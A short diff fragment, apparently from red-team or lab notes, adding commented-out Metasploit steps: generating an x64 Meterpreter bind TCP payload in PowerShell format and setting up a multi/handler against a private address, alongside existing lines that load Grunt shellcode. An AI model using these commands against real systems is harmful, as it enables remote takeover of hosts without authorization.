@@ -25,3 +25,13 @@ exploit -j
 #set SESSION 1
 #set SHELLCODE /tmp/HTTPGrunt.bin
 #run
+
+
+
+#Generate an x64 bind TCP Meterpreter payload using msfconsole or msfvenom and output to .ps1 using the psh-net format type.
+#prtfwd
+#use exploit/multi/handler
+#set payload windows/x64/meterpreter/bind_tcp
+#set LPORT 4444
+#set RHOST 10.10.120.20
+#exploit -j
